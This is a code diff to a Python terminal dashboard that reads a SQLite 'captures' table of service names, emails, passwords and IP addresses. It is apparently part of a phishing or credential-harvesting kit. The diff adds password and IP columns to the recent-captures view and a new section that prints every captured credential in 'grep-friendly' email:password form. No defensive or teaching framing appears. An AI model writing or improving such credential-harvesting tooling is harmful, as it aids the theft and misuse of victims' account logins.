@@ -17,6 +17,7 @@ G = "\033[0;32m"
 Y = "\033[1;33m"
 C = "\033[0;36m"
 W = "\033[1;37m"
+D = "\033[2m"
 N = "\033[0m"
 
 
@@ -73,12 +74,29 @@ def main() -> int:
         print(f"  {ip:<20s} {G}{cnt}{N}{tag}")
     print()
 
-    # Recent activity
-    print(f"{Y}  ── Recent activity (last 5) ───────────────{N}")
-    c.execute("SELECT timestamp, service, email FROM captures ORDER BY id DESC LIMIT 5")
-    for ts, svc, em in c.fetchall():
+    # Recent activity — with credentials
+    print(f"{Y}  ── Recent captures (last 10) ─────────────────────────────────{N}")
+    print(f"  {W}{'time':<11s} {'service':<10s} {'email':<28s} {'password':<20s} {'IP'}{N}")
+    print(f"  {D}{'-'*11} {'-'*10} {'-'*28} {'-'*20} {'-'*15}{N}")
+    c.execute(
+        "SELECT timestamp, service, email, password, ip_address "
+        "FROM captures ORDER BY id DESC LIMIT 10"
+    )
+    for ts, svc, em, pw, ip in c.fetchall():
         t = datetime.fromisoformat(ts).strftime("%m-%d %H:%M")
-        print(f"  {t}  {C}{svc:<10s}{N}  {em}")
+        em_disp = (em[:26] + "..") if len(em) > 28 else em
+        pw_disp = (pw[:18] + "..") if len(pw) > 20 else pw
+        print(
+            f"  {C}{t:<11s}{N} {W}{svc:<10s}{N} "
+            f"{Y}{em_disp:<28s}{N} {G}{pw_disp:<20s}{N} {D}{ip}{N}"
+        )
+    print()
+
+    # All credentials dump (email:password format — grep-friendly)
+    print(f"{Y}  ── All credentials (email:password) ──────────{N}")
+    c.execute("SELECT service, email, password FROM captures ORDER BY id DESC")
+    for svc, em, pw in c.fetchall():
+        print(f"  {W}[{svc:<10s}]{N} {Y}{em}{N}:{G}{pw}{N}")
     print()
 
     # Time range
